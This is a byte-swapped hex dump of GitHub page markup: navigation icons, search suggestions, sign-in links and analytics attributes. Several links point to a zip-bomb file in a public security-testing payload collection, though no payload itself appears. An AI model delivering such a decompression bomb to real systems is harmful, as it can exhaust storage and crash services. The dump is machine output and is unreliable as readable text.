0006630 3131 342d 372e 3420 372e 342d 372e 3220
0006640 352e 2039 2030 2e34 2037 2e32 3131 3420
0006650 372e 3420 372e 3020 3220 352e 2d39 2e32
0006660 3131 3420 372e 342d 372e 3420 372e 227a
0006670 3e2f 2f3c 7673 3e67 200a 2020 3c20 642f
0006680 7669 0a3e 200a 2020 3c20 6d69 2067 6c63
0006690 7361 3d73 6122 6176 6174 2072 726d 322d
00066a0 6620 656c 2d78 6873 6972 6b6e 302d 6a20
00066b0 2d73 756a 706d 742d 2d6f 7573 6767 7365
00066c0 6974 6e6f 612d 6176 6174 2072 2d64 6f6e
00066d0 656e 2022 6c61 3d74 2222 6120 6972 2d61
00066e0 616c 6562 3d6c 5422 6165 226d 7320 6372
00066f0 223d 2022 6977 7464 3d68 3222 2238 6820
0006700 6965 6867 3d74 3222 2238 0a3e 200a 2020
0006710 3c20 6964 2076 6c63 7361 3d73 6a22 6d75
0006720 2d70 6f74 732d 6775 6567 7473 6f69 2d6e
0006730 616e 656d 6a20 2d73 756a 706d 742d 2d6f
0006740 7573 6767 7365 6974 6e6f 6e2d 6d61 2065
0006750 6c66 7865 612d 7475 206f 766f 7265 6c66
0006760 776f 682d 6469 6564 206e 6574 7478 6c2d
0006770 6665 2074 6f6e 772d 6172 2070 7363 2d73
0006780 7274 6e75 6163 6574 6320 7373 742d 7572
0006790 636e 7461 2d65 6174 6772 7465 3e22 200a
00067a0 2020 3c20 642f 7669 0a3e 200a 2020 3c20
00067b0 6964 2076 6c63 7361 3d73 6222 726f 6564
00067c0 2072 6f72 6e75 6564 2d64 2031 6c66 7865
00067d0 732d 7268 6e69 2d6b 2030 6762 672d 6172
00067e0 2079 7870 312d 7420 7865 2d74 7267 7961
00067f0 6c2d 6769 7468 6d20 2d6c 2031 3666 6420
0006800 6e2d 6e6f 2065 736a 6a2d 6d75 2d70 6f74
0006810 622d 6461 6567 732d 6165 6372 2268 0a3e
0006820 2020 2020 2020 733c 6170 206e 6c63 7361
0006830 3d73 6a22 2d73 756a 706d 742d 2d6f 6162
0006840 6764 2d65 6573 7261 6863 742d 7865 2d74
0006850 6564 6166 6c75 2074 2d64 6f6e 656e 2022
0006860 7261 6169 6c2d 6261 6c65 223d 6e69 7420
0006870 6968 2073 6572 6f70 6973 6f74 7972 3e22
0006880 200a 2020 2020 2020 4920 206e 6874 7369
0006890 7220 7065 736f 7469 726f 0a79 2020 2020
00068a0 2020 2f3c 7073 6e61 0a3e 2020 2020 2020
00068b0 733c 6170 206e 6c63 7361 3d73 6a22 2d73
00068c0 756a 706d 742d 2d6f 6162 6764 2d65 6573
00068d0 7261 6863 742d 7865 2d74 6c67 626f 6c61
00068e0 6420 6e2d 6e6f 2265 6120 6972 2d61 616c
00068f0 6562 3d6c 6922 206e 6c61 206c 666f 4720
0006900 7469 7548 2262 0a3e 2020 2020 2020 2020
0006910 6c41 206c 6947 4874 6275 200a 2020 2020
0006920 3c20 732f 6170 3e6e 200a 2020 2020 3c20
0006930 7073 6e61 6120 6972 2d61 6968 6464 6e65
0006940 223d 7274 6575 2022 6c63 7361 3d73 6422
0006950 692d 6c6e 6e69 2d65 6c62 636f 206b 6c6d
0006960 312d 7620 612d 696c 6e67 6d2d 6469 6c64
0006970 2265 e23e b586 2f3c 7073 6e61 0a3e 2020
0006980 2020 2f3c 6964 3e76 0a0a 2020 2020 643c
0006990 7669 6120 6972 2d61 6968 6464 6e65 223d
00069a0 7274 6575 2022 6c63 7361 3d73 6222 726f
00069b0 6564 2072 6f72 6e75 6564 2d64 2031 6c66
00069c0 7865 732d 7268 6e69 2d6b 2030 6762 672d
00069d0 6172 2079 7870 312d 7420 7865 2d74 7267
00069e0 7961 6c2d 6769 7468 6d20 2d6c 2031 3666
00069f0 6420 6e2d 6e6f 2065 2d64 6e6f 6e2d 7661
0006a00 662d 636f 7375 6a20 2d73 756a 706d 742d
0006a10 2d6f 6162 6764 2d65 756a 706d 3e22 200a
0006a20 2020 2020 4a20 6d75 2070 6f74 200a 2020
0006a30 2020 3c20 7073 6e61 6320 616c 7373 223d
0006a40 2d64 6e69 696c 656e 622d 6f6c 6b63 6d20
0006a50 2d6c 2031 2d76 6c61 6769 2d6e 696d 6464
0006a60 656c 3e22 86e2 3cb5 732f 6170 3e6e 200a
0006a70 2020 3c20 642f 7669 0a3e 2020 2f3c 3e61
0006a80 3c0a 6c2f 3e69 0a0a 2020 0a0a 6c3c 2069
0006a90 6c63 7361 3d73 6422 662d 656c 2078 6c66
0006aa0 7865 6a2d 7375 6974 7966 732d 6174 7472
0006ab0 6620 656c 2d78 7469 6d65 2d73 6563 746e
0006ac0 7265 7020 302d 6620 2035 616e 6976 6167
0006ad0 6974 6e6f 692d 6574 206d 736a 6e2d 7661
0006ae0 6769 7461 6f69 2d6e 7469 6d65 6a20 2d73
0006af0 756a 706d 742d 2d6f 6c67 626f 6c61 732d
0006b00 6165 6372 2068 2d64 6f6e 656e 2022 6f72
0006b10 656c 223d 706f 6974 6e6f 3e22 200a 3c20
0006b20 2061 6174 6962 646e 7865 223d 312d 2022
0006b30 6c63 7361 3d73 6e22 2d6f 6e75 6564 6c72
0006b40 6e69 2065 2d64 6c66 7865 6620 656c 2d78
0006b50 7561 6f74 6620 656c 2d78 7469 6d65 2d73
0006b60 6563 746e 7265 6a20 6d75 2d70 6f74 732d
0006b70 6775 6567 7473 6f69 736e 702d 7461 2068
0006b80 736a 6a2d 6d75 2d70 6f74 732d 6775 6567
0006b90 7473 6f69 2d6e 6170 6874 6a20 2d73 616e
0006ba0 6976 6167 6974 6e6f 6f2d 6570 206e 2d70
0006bb0 2232 6820 6572 3d66 2222 0a3e 2020 2020
0006bc0 643c 7669 6320 616c 7373 223d 756a 706d
0006bd0 742d 2d6f 636f 6974 6f63 206e 736a 6a2d
0006be0 6d75 2d70 6f74 6f2d 7463 6369 6e6f 6620
0006bf0 656c 2d78 6873 6972 6b6e 302d 6d20 2d72
0006c00 2032 6574 7478 632d 6e65 6574 2072 2d64
0006c10 6f6e 656e 3e22 200a 2020 2020 3c20 7673
0006c20 2067 6568 6769 7468 223d 3631 2022 6977
0006c30 7464 3d68 3122 2236 6320 616c 7373 223d
0006c40 636f 6974 6f63 206e 636f 6974 6f63 2d6e
0006c50 6572 6f70 6620 656c 2d78 6873 6972 6b6e
0006c60 302d 6a20 2d73 756a 706d 742d 2d6f 636f
0006c70 6974 6f63 2d6e 6572 6f70 6420 6e2d 6e6f
0006c80 2265 7420 7469 656c 223d 6552 6f70 6973
0006c90 6f74 7972 2022 7261 6169 6c2d 6261 6c65
0006ca0 223d 6552 6f70 6973 6f74 7972 2022 6976
0006cb0 7765 6f42 3d78 3022 3020 3120 2032 3631
0006cc0 2022 6576 7372 6f69 3d6e 3122 312e 2022
0006cd0 6f72 656c 223d 6d69 2267 3c3e 6170 6874
0006ce0 6620 6c69 2d6c 7572 656c 223d 7665 6e65
0006cf0 646f 2264 6420 223d 344d 3920 3348 3856
0006d00 3168 3176 6d7a 2d30 4833 7633 6831 5631
0006d10 7a36 306d 322d 3348 3176 3168 3456 6d7a
0006d20 2d30 4832 7633 6831 5631 7a32 386d 312d
0006d30 3176 6332 2030 352e 2d35 342e 2035 2d31
0006d40 2031 4831 7636 6c32 312d 352e 312d 352e
0006d50 334c 3120 7636 322d 3148 2d63 352e 2035
0006d60 2d30 2d31 342e 2d35 2d31 5631 6331 2d30
0006d70 352e 2e35 3534 312d 3120 312d 3168 6330
0006d80 352e 2035 2030 2031 342e 2035 2031 7a31
0006d90 2d6d 2031 3031 3148 3276 3268 2d76 6831
0006da0 7633 6831 7635 322d 6d7a 2d30 3031 3248
0006db0 3976 3968 3156 227a 3e2f 2f3c 7673 3e67
0006dc0 200a 2020 2020 3c20 7673 2067 6568 6769
0006dd0 7468 223d 3631 2022 6977 7464 3d68 3122
0006de0 2236 6320 616c 7373 223d 636f 6974 6f63
0006df0 206e 636f 6974 6f63 2d6e 7270 6a6f 6365
0006e00 2074 6c66 7865 732d 7268 6e69 2d6b 2030
0006e10 736a 6a2d 6d75 2d70 6f74 6f2d 7463 6369
0006e20 6e6f 702d 6f72 656a 7463 6420 6e2d 6e6f
0006e30 2265 7420 7469 656c 223d 7250 6a6f 6365
0006e40 2274 6120 6972 2d61 616c 6562 3d6c 5022
0006e50 6f72 656a 7463 2022 6976 7765 6f42 3d78
0006e60 3022 3020 3120 2035 3631 2022 6576 7372
0006e70 6f69 3d6e 3122 312e 2022 6f72 656c 223d
0006e80 6d69 2267 3c3e 6170 6874 6620 6c69 2d6c
0006e90 7572 656c 223d 7665 6e65 646f 2264 6420
0006ea0 223d 314d 2030 3231 3368 3256 2d68 7633
0006eb0 3031 6d7a 342d 322d 3368 3256 3648 3876
0006ec0 6d7a 342d 3420 3368 3256 3248 3176 7a32
0006ed0 2d6d 2031 6831 3331 3156 3148 3176 7a34
0006ee0 314d 2034 4830 6131 2031 2031 2030 2030
0006ef0 2d30 2031 7631 3431 3161 3120 3020 3020
0006f00 3020 3120 3120 3168 6133 2031 2031 2030
0006f10 2030 2030 2d31 5631 6131 2031 2031 2030
0006f20 2030 2d30 2d31 7a31 2f22 3c3e 732f 6776
0006f30 0a3e 2020 2020 2020 733c 6776 6820 6965
0006f40 6867 3d74 3122 2236 7720 6469 6874 223d
0006f50 3631 2022 6c63 7361 3d73 6f22 7463 6369
0006f60 6e6f 6f20 7463 6369 6e6f 732d 6165 6372
0006f70 2068 6c66 7865 732d 7268 6e69 2d6b 2030
0006f80 736a 6a2d 6d75 2d70 6f74 6f2d 7463 6369
0006f90 6e6f 732d 6165 6372 2068 2d64 6f6e 656e
0006fa0 2022 6974 6c74 3d65 5322 6165 6372 2268
0006fb0 6120 6972 2d61 616c 6562 3d6c 5322 6165
0006fc0 6372 2268 7620 6569 4277 786f 223d 2030
0006fd0 2030 3631 3120 2236 7620 7265 6973 6e6f
0006fe0 223d 2e31 2231 7220 6c6f 3d65 6922 676d
0006ff0 3e22 703c 7461 2068 6966 6c6c 722d 6c75
0007000 3d65 6522 6576 6f6e 6464 2022 3d64 4d22
0007010 3531 372e 3120 2e33 6c33 332d 382e 2d31
0007020 2e33 3338 3541 392e 2033 2e35 3339 3020
0007030 3020 3020 3120 2033 6336 2d30 2e33 3133
0007040 322d 362e 2d39 2d36 2d36 5336 2031 2e32
0007050 3936 3120 3620 3273 362e 2039 2036 2036
0007060 6336 2e31 2033 2030 2e32 3834 2e2d 3134
0007070 3320 342e 2d37 2e31 3131 336c 382e 2033
0007080 2e33 3138 2e63 3931 322e 342e 2e35 2e33
0007090 2e37 2e33 3532 3020 2e20 3235 2e2d 3930
00070a0 372e 2e2d 6133 392e 3639 392e 3639 3020
00070b0 3020 3020 3020 312d 342e 7631 302e 7a31
00070c0 374d 3120 2e30 6337 322d 352e 2039 2d30
00070d0 2e34 2d37 2e32 3131 342d 372e 342d 372e
00070e0 3020 322d 352e 2039 2e32 3131 342d 372e
00070f0 3420 372e 342d 372e 3220 352e 2039 2030
0007100 2e34 2037 2e32 3131 3420 372e 3420 372e
0007110 3020 3220 352e 2d39 2e32 3131 3420 372e
0007120 342d 372e 3420 372e 227a 3e2f 2f3c 7673
0007130 3e67 200a 2020 3c20 642f 7669 0a3e 200a
0007140 2020 3c20 6d69 2067 6c63 7361 3d73 6122
0007150 6176 6174 2072 726d 322d 6620 656c 2d78
0007160 6873 6972 6b6e 302d 6a20 2d73 756a 706d
0007170 742d 2d6f 7573 6767 7365 6974 6e6f 612d
0007180 6176 6174 2072 2d64 6f6e 656e 2022 6c61
0007190 3d74 2222 6120 6972 2d61 616c 6562 3d6c
00071a0 5422 6165 226d 7320 6372 223d 2022 6977
00071b0 7464 3d68 3222 2238 6820 6965 6867 3d74
00071c0 3222 2238 0a3e 200a 2020 3c20 6964 2076
00071d0 6c63 7361 3d73 6a22 6d75 2d70 6f74 732d
00071e0 6775 6567 7473 6f69 2d6e 616e 656d 6a20
00071f0 2d73 756a 706d 742d 2d6f 7573 6767 7365
0007200 6974 6e6f 6e2d 6d61 2065 6c66 7865 612d
0007210 7475 206f 766f 7265 6c66 776f 682d 6469
0007220 6564 206e 6574 7478 6c2d 6665 2074 6f6e
0007230 772d 6172 2070 7363 2d73 7274 6e75 6163
0007240 6574 6320 7373 742d 7572 636e 7461 2d65
0007250 6174 6772 7465 3e22 200a 2020 3c20 642f
0007260 7669 0a3e 200a 2020 3c20 6964 2076 6c63
0007270 7361 3d73 6222 726f 6564 2072 6f72 6e75
0007280 6564 2d64 2031 6c66 7865 732d 7268 6e69
0007290 2d6b 2030 6762 672d 6172 2079 7870 312d
00072a0 7420 7865 2d74 7267 7961 6c2d 6769 7468
00072b0 6d20 2d6c 2031 3666 6420 6e2d 6e6f 2065
00072c0 736a 6a2d 6d75 2d70 6f74 622d 6461 6567
00072d0 732d 6165 6372 2268 0a3e 2020 2020 2020
00072e0 733c 6170 206e 6c63 7361 3d73 6a22 2d73
00072f0 756a 706d 742d 2d6f 6162 6764 2d65 6573
0007300 7261 6863 742d 7865 2d74 6564 6166 6c75
0007310 2074 2d64 6f6e 656e 2022 7261 6169 6c2d
0007320 6261 6c65 223d 6e69 7420 6968 2073 6572
0007330 6f70 6973 6f74 7972 3e22 200a 2020 2020
0007340 2020 4920 206e 6874 7369 7220 7065 736f
0007350 7469 726f 0a79 2020 2020 2020 2f3c 7073
0007360 6e61 0a3e 2020 2020 2020 733c 6170 206e
0007370 6c63 7361 3d73 6a22 2d73 756a 706d 742d
0007380 2d6f 6162 6764 2d65 6573 7261 6863 742d
0007390 7865 2d74 6c67 626f 6c61 6420 6e2d 6e6f
00073a0 2265 6120 6972 2d61 616c 6562 3d6c 6922
00073b0 206e 6c61 206c 666f 4720 7469 7548 2262
00073c0 0a3e 2020 2020 2020 2020 6c41 206c 6947
00073d0 4874 6275 200a 2020 2020 3c20 732f 6170
00073e0 3e6e 200a 2020 2020 3c20 7073 6e61 6120
00073f0 6972 2d61 6968 6464 6e65 223d 7274 6575
0007400 2022 6c63 7361 3d73 6422 692d 6c6e 6e69
0007410 2d65 6c62 636f 206b 6c6d 312d 7620 612d
0007420 696c 6e67 6d2d 6469 6c64 2265 e23e b586
0007430 2f3c 7073 6e61 0a3e 2020 2020 2f3c 6964
0007440 3e76 0a0a 2020 2020 643c 7669 6120 6972
0007450 2d61 6968 6464 6e65 223d 7274 6575 2022
0007460 6c63 7361 3d73 6222 726f 6564 2072 6f72
0007470 6e75 6564 2d64 2031 6c66 7865 732d 7268
0007480 6e69 2d6b 2030 6762 672d 6172 2079 7870
0007490 312d 7420 7865 2d74 7267 7961 6c2d 6769
00074a0 7468 6d20 2d6c 2031 3666 6420 6e2d 6e6f
00074b0 2065 2d64 6e6f 6e2d 7661 662d 636f 7375
00074c0 6a20 2d73 756a 706d 742d 2d6f 6162 6764
00074d0 2d65 756a 706d 3e22 200a 2020 2020 4a20
00074e0 6d75 2070 6f74 200a 2020 2020 3c20 7073
00074f0 6e61 6320 616c 7373 223d 2d64 6e69 696c
0007500 656e 622d 6f6c 6b63 6d20 2d6c 2031 2d76
0007510 6c61 6769 2d6e 696d 6464 656c 3e22 86e2
0007520 3cb5 732f 6170 3e6e 200a 2020 3c20 642f
0007530 7669 0a3e 2020 2f3c 3e61 3c0a 6c2f 3e69
0007540 0a0a 3c0a 752f 3e6c 0a0a 2020 2020 2020
0007550 2020 2020 2020 2f3c 6964 3e76 200a 2020
0007560 2020 3c20 6c2f 6261 6c65 0a3e 2f3c 6f66
0007570 6d72 203e 3c20 642f 7669 0a3e 2f3c 6964
0007580 3e76 0a0a 2020 2020 2020 2020 2020 2f3c
0007590 6964 3e76 0a0a 2020 2020 2020 2020 613c
00075a0 6320 616c 7373 223d 6548 6461 7265 654d
00075b0 756e 6c2d 6e69 206b 6f6e 752d 646e 7265
00075c0 696c 656e 6d20 2d72 2233 6420 7461 2d61
00075d0 7968 7264 2d6f 6c63 6369 3d6b 7b22 7126
00075e0 6f75 3b74 7665 6e65 5f74 7974 6570 7126
00075f0 6f75 3b74 263a 7571 746f 613b 7475 6568
0007600 746e 6369 7461 6f69 2e6e 6c63 6369 266b
0007610 7571 746f 2c3b 7126 6f75 3b74 6170 6c79
0007620 616f 2664 7571 746f 3a3b 267b 7571 746f
0007630 6c3b 636f 7461 6f69 5f6e 6e69 705f 6761
0007640 2665 7571 746f 3a3b 7126 6f75 3b74 6973
0007650 6574 6820 6165 6564 2072 656d 756e 7126
0007660 6f75 3b74 262c 7571 746f 723b 7065 736f
0007670 7469 726f 5f79 6469 7126 6f75 3b74 6e3a
0007680 6c75 2c6c 7126 6f75 3b74 7561 6874 745f
0007690 7079 2665 7571 746f 3a3b 7126 6f75 3b74
00076a0 4f4c 5f47 4e49 7126 6f75 3b74 262c 7571
00076b0 746f 633b 696c 6e65 5f74 6469 7126 6f75
00076c0 3b74 6e3a 6c75 2c6c 7126 6f75 3b74 726f
00076d0 6769 6e69 7461 6e69 5f67 6572 7571 7365
00076e0 5f74 6469 7126 6f75 3b74 263a 7571 746f
00076f0 433b 3741 3a37 3837 3445 343a 3530 3130
0007700 3a31 4336 3631 3246 353a 4343 4543 3742
0007710 2646 7571 746f 2c3b 7126 6f75 3b74 726f
0007720 6769 6e69 7461 6e69 5f67 7275 266c 7571
0007730 746f 3a3b 7126 6f75 3b74 7468 7074 3a73
0007740 2f2f 6967 6874 6275 632e 6d6f 642f 6e61
0007750 6569 6d6c 6569 7373 656c 2f72 6553 4c63
0007760 7369 7374 622f 6f6c 2f62 616d 7473 7265
0007770 502f 7961 6f6c 6461 2f73 695a 2d70 6f42
0007780 626d 2f73 3234 7a2e 7069 7126 6f75 3b74
0007790 262c 7571 746f 723b 6665 7265 6572 2672
00077a0 7571 746f 3a3b 756e 6c6c 262c 7571 746f
00077b0 753b 6573 5f72 6469 7126 6f75 3b74 6e3a
00077c0 6c75 7d6c 227d 6420 7461 2d61 7968 7264
00077d0 2d6f 6c63 6369 2d6b 6d68 6361 223d 3739
00077e0 6231 3734 3262 6264 6163 6562 3234 3731
00077f0 3638 3965 3836 6237 3264 3534 3336 3534
0007800 6433 6239 6237 3935 6435 3937 3939 3062
0007810 6461 3962 6334 6336 3834 3435 3934 2022
0007820 6164 6174 672d 2d61 6c63 6369 3d6b 2822
0007830 6f4c 6767 6465 6f20 7475 2029 6548 6461
0007840 7265 202c 6c63 6369 656b 2064 6953 6e67
0007850 6920 2c6e 7420 7865 3a74 6973 6e67 692d
0007860 226e 6820 6572 3d66 2f22 6f6c 6967 3f6e
0007870 6572 7574 6e72 745f 3d6f 3225 6446 6e61
0007880 6569 6d6c 6569 7373 656c 2572 4632 6553
0007890 4c63 7369 7374 3225 6246 6f6c 2562 4632
00078a0 616d 7473 7265 3225 5046 7961 6f6c 6461
00078b0 2573 4632 695a 2d70 6f42 626d 2573 4632
00078c0 3234 7a2e 7069 3e22 200a 2020 2020 2020
00078d0 2020 5320 6769 266e 626e 7073 693b 0a6e
00078e0 2f3c 3e61 2020 2020 2020 2020 2020 613c
00078f0 6320 616c 7373 223d 6548 6461 7265 654d
0007900 756e 6c2d 6e69 206b 2d64 6e69 696c 656e
0007910 622d 6f6c 6b63 6e20 2d6f 6e75 6564 6c72
0007920 6e69 2065 6f62 6472 7265 6220 726f 6564
0007930 2d72 7267 7961 642d 7261 206b 6f72 6e75
0007940 6564 2d64 2031 7870 322d 7020 2d79 2231
0007950 6420 7461 2d61 7968 7264 2d6f 6c63 6369
0007960 3d6b 7b22 7126 6f75 3b74 7665 6e65 5f74
0007970 7974 6570 7126 6f75 3b74 263a 7571 746f
0007980 613b 7475 6568 746e 6369 7461 6f69 2e6e
0007990 6c63 6369 266b 7571 746f 2c3b 7126 6f75
00079a0 3b74 6170 6c79 616f 2664 7571 746f 3a3b
00079b0 267b 7571 746f 6c3b 636f 7461 6f69 5f6e
00079c0 6e69 705f 6761 2665 7571 746f 3a3b 7126
00079d0 6f75 3b74 6973 6574 6820 6165 6564 2072
00079e0 656d 756e 7126 6f75 3b74 262c 7571 746f
00079f0 723b 7065 736f 7469 726f 5f79 6469 7126
0007a00 6f75 3b74 6e3a 6c75 2c6c 7126 6f75 3b74
0007a10 7561 6874 745f 7079 2665 7571 746f 3a3b
0007a20 7126 6f75 3b74 4953 4e47 555f 2650 7571
0007a30 746f 2c3b 7126 6f75 3b74 6c63 6569 746e
0007a40 695f 2664 7571 746f 3a3b 756e 6c6c 262c
0007a50 7571 746f 6f3b 6972 6967 616e 6974 676e
0007a60 725f 7165 6575 7473 695f 2664 7571 746f
0007a70 3a3b 7126 6f75 3b74 4143 3737 373a 4538
0007a80 3a34 3034 3035 3131 363a 3143 4636 3a32
0007a90 4335 4343 4245 4637 7126 6f75 3b74 262c
0007aa0 7571 746f 6f3b 6972 6967 616e 6974 676e
0007ab0 755f 6c72 7126 6f75 3b74 263a 7571 746f
0007ac0 683b 7474 7370 2f3a 672f 7469 7568 2e62
0007ad0 6f63 2f6d 6164 696e 6c65 696d 7365 6c73
0007ae0 7265 532f 6365 694c 7473 2f73 6c62 626f
0007af0 6d2f 7361 6574 2f72 6150 6c79 616f 7364
0007b00 5a2f 7069 422d 6d6f 7362 342f 2e32 697a
0007b10 2670 7571 746f 2c3b 7126 6f75 3b74 6572
0007b20 6566 7272 7265 7126 6f75 3b74 6e3a 6c75
0007b30 2c6c 7126 6f75 3b74 7375 7265 695f 2664
0007b40 7571 746f 3a3b 756e 6c6c 7d7d 2022 6164
0007b50 6174 682d 6479 6f72 632d 696c 6b63 682d
0007b60 616d 3d63 6322 3866 3963 3061 3166 3632
0007b70 6530 3732 6564 6663 6134 3762 3032 3764
0007b80 3066 3933 3065 6538 3437 3530 3461 3539
0007b90 3436 6535 3265 3062 3936 6232 3031 6363
0007ba0 6230 3334 2235 6420 7461 2d61 6167 632d
0007bb0 696c 6b63 223d 4c28 676f 6567 2064 756f
0007bc0 2974 4820 6165 6564 2c72 6320 696c 6b63
0007bd0 6465 5320 6769 206e 7075 202c 6574 7478
0007be0 733a 6769 2d6e 7075 2022 7268 6665 223d
0007bf0 6a2f 696f 226e 0a3e 2020 2020 2020 2020
0007c00 2020 2020 6953 6e67 6e26 7362 3b70 7075
0007c10 3c0a 612f 203e 2020 2020 3c20 642f 7669
0007c20 0a3e 2020 2020 2f3c 6964 3e76 200a 3c20
0007c30 642f 7669 0a3e 2f3c 6568 6461 7265 0a3e
0007c40 200a 3c20 642f 7669 0a3e 200a 3c20 6964
0007c50 2076 6469 223d 7473 7261 2d74 666f 632d
0007c60 6e6f 6574 746e 2022 6c63 7361 3d73 7322
0007c70 6f68 2d77 6e6f 662d 636f 7375 3e22 2f3c
0007c80 6964 3e76 0a0a 200a 2020 3c20 6964 2076
0007c90 6469 223d 736a 662d 616c 6873 632d 6e6f
0007ca0 6174 6e69 7265 3e22 0a0a 2f3c 6964 3e76
0007cb0 0a0a 0a0a 2020 643c 7669 6320 616c 7373
0007cc0 223d 7061 6c70 6369 7461 6f69 2d6e 616d
0007cd0 6e69 2220 6420 7461 2d61 6f63 6d6d 7469
0007ce0 682d 766f 7265 6163 6472 2d73 6e65 6261
0007cf0 656c 3e64 200a 2020 2020 2020 3c20 6964
0007d00 2076 7469 6d65 6373 706f 2065 7469 6d65
0007d10 7974 6570 223d 7468 7074 2f3a 732f 6863
0007d20 6d65 2e61 726f 2f67 6f53 7466 6177 6572
0007d30 6f53 7275 6563 6f43 6564 2022 6c63 7361
0007d40 3d73 2222 0a3e 2020 2020 6d3c 6961 206e
0007d50 6469 223d 736a 722d 7065 2d6f 6a70 7861
0007d60 632d 6e6f 6174 6e69 7265 2022 6164 6174
0007d70 702d 616a 2d78 6f63 746e 6961 656e 2072
0007d80 0a3e 2020 2020 2020 0a0a 200a 0a20 0a0a
0007d90 0a0a 0a0a 2020 643c 7669 6320 616c 7373
0007da0 223d 6170 6567 6568 6461 7220 7065 686f
0007db0 6165 2064 6e69 7473 7061 7061 7265 695f
0007dc0 6e67 726f 2065 6572 6461 6261 6c69 7469
0007dd0 2d79 656d 756e 6520 7078 7265 6d69 6e65
0007de0 2d74 6572 6f70 6e2d 7661 2020 3e22 200a
0007df0 2020 3c20 6964 2076 6c63 7361 3d73 7222
0007e00 7065 686f 6165 2d64 6564 6174 6c69 2d73
0007e10 6f63 746e 6961 656e 2072 6c63 6165 6672
0007e20 7869 6320 6e6f 6174 6e69 7265 3e22 0a0a
0007e30 2020 2020 2020 753c 206c 6c63 7361 3d73
0007e40 7022 6761 6865 6165 2d64 6361 6974 6e6f
0007e50 2273 0a3e 0a0a 200a 3c20 696c 0a3e 2020
0007e60 2020 200a 3c20 2061 6c63 7361 3d73 7422
0007e70 6f6f 746c 7069 6570 2064 6f74 6c6f 6974
0007e80 7070 6465 732d 6220 6e74 6220 6e74 732d
0007e90 206d 7462 2d6e 6977 6874 632d 756f 746e
0007ea0 2022 7261 6169 6c2d 6261 6c65 223d 6f59
0007eb0 2075 756d 7473 6220 2065 6973 6e67 6465
0007ec0 6920 206e 6f74 7720 7461 6863 6120 7220
0007ed0 7065 736f 7469 726f 2279 7220 6c65 223d
0007ee0 6f6e 6f66 6c6c 776f 2022 6164 6174 682d
0007ef0 6479 6f72 632d 696c 6b63 223d 267b 7571
0007f00 746f 653b 6576 746e 745f 7079 2665 7571
0007f10 746f 3a3b 7126 6f75 3b74 7561 6874 6e65
0007f20 6974 6163 6974 6e6f 632e 696c 6b63 7126
0007f30 6f75 3b74 262c 7571 746f 703b 7961 6f6c
0007f40 6461 7126 6f75 3b74 7b3a 7126 6f75 3b74
0007f50 6f6c 6163 6974 6e6f 695f 5f6e 6170 6567
0007f60 7126 6f75 3b74 263a 7571 746f 6e3b 746f
0007f70 6669 6369 7461 6f69 206e 7573 7362 7263
0007f80 7069 6974 6e6f 6d20 6e65 2075 6177 6374
0007f90 2668 7571 746f 2c3b 7126 6f75 3b74 6572
0007fa0 6f70 6973 6f74 7972 695f 2664 7571 746f
0007fb0 3a3b 756e 6c6c 262c 7571 746f 613b 7475
0007fc0 5f68 7974 6570 7126 6f75 3b74 263a 7571
0007fd0 746f 4c3b 474f 495f 264e 7571 746f 2c3b
0007fe0 7126 6f75 3b74 6c63 6569 746e 695f 2664
0007ff0 7571 746f 3a3b 756e 6c6c 262c 7571 746f
0008000 6f3b 6972 6967 616e 6974 676e 725f 7165
0008010 6575 7473 695f 2664 7571 746f 3a3b 7126
0008020 6f75 3b74 4143 3737 373a 4538 3a34 3034
0008030 3035 3131 363a 3143 4636 3a32 4335 4343
0008040 4245 4637 7126 6f75 3b74 262c 7571 746f
0008050 6f3b 6972 6967 616e 6974 676e 755f 6c72
0008060 7126 6f75 3b74 263a 7571 746f 683b 7474
0008070 7370 2f3a 672f 7469 7568 2e62 6f63 2f6d
0008080 6164 696e 6c65 696d 7365 6c73 7265 532f
0008090 6365 694c 7473 2f73 6c62 626f 6d2f 7361
00080a0 6574 2f72 6150 6c79 616f 7364 5a2f 7069
00080b0 422d 6d6f 7362 342f 2e32 697a 2670 7571
00080c0 746f 2c3b 7126 6f75 3b74 6572 6566 7272
00080d0 7265 7126 6f75 3b74 6e3a 6c75 2c6c 7126
00080e0 6f75 3b74 7375 7265 695f 2664 7571 746f
00080f0 3a3b 756e 6c6c 7d7d 2022 6164 6174 682d
0008100 6479 6f72 632d 696c 6b63 682d 616d 3d63
0008110 3022 6638 3962 6161 6532 3933 3761 6336
0008120 3762 6438 3961 3632 6630 3261 3032 6435
0008130 6662 6637 6334 3835 3138 3834 3835 3465
0008140 6664 3436 6563 6663 6334 3731 6564 3064
0008150 2230 6820 6572 3d66 2f22 6f6c 6967 3f6e
0008160 6572 7574 6e72 745f 3d6f 3225 6446 6e61
0008170 6569 6d6c 6569 7373 656c 2572 4632 6553
0008180 4c63 7369 7374 3e22 200a 2020 3c20 7673
0008190 2067 6c63 7361 3d73 6f22 7463 6369 6e6f
00081a0 6f20 7463 6369 6e6f 652d 6579 7620 612d
00081b0 696c 6e67 742d 7865 2d74 6f62 7474 6d6f
00081c0 2022 6976 7765 6f42 3d78 3022 3020 3120
00081d0 2036 3631 2022 6576 7372 6f69 3d6e 3122
00081e0 312e 2022 6977 7464 3d68 3122 2236 6820
00081f0 6965 6867 3d74 3122 2236 6120 6972 2d61
0008200 6968 6464 6e65 223d 7274 6575 3e22 703c
0008210 7461 2068 6966 6c6c 722d 6c75 3d65 6522
0008220 6576 6f6e 6464 2022 3d64 4d22 2e38 3630
0008230 3220 3343 3220 3020 3820 3020 3820 3373
0008240 3620 3820 302e 2036 4336 3331 3120 2034
0008250 3631 3820 3120 2036 7338 332d 362d 372d
0008260 392e 2d34 7a36 384d 3120 6332 322d 322e
0008270 3020 342d 312d 372e 2d38 2d34 2034 2d30
0008280 2e32 2032 2e31 2d38 2034 2d34 2034 2e32
0008290 3232 3020 3420 3120 382e 3420 3420 3020
00082a0 3220 322e 2d32 2e31 3837 3420 342d 3420
00082b0 6d7a 2d32 6334 2030 2e31 3131 2e2d 3938
00082c0 3220 322d 3220 312d 312e 2031 2d30 2d32
00082d0 382e 2d39 2d32 2032 2d30 2e31 3131 382e
00082e0 2d39 2032 2d32 2032 2e31 3131 3020 3220
00082f0 2e20 3938 3220 3220 227a 3e2f 2f3c 7673
0008300 3e67 200a 2020 5720 7461 6863 3c0a 612f
0008310 203e 2020 3c20 2061 6c63 7361 3d73 7322
0008320 636f 6169 2d6c 6f63 6e75 2274 6820 6572
0008330 3d66 2f22 6164 696e 6c65 696d 7365 6c73
0008340 7265 532f 6365 694c 7473 2f73 6177 6374
0008350 6568 7372 0a22 2020 2020 2020 6120 6972
0008360 2d61 616c 6562 3d6c 3122 3034 2036 7375
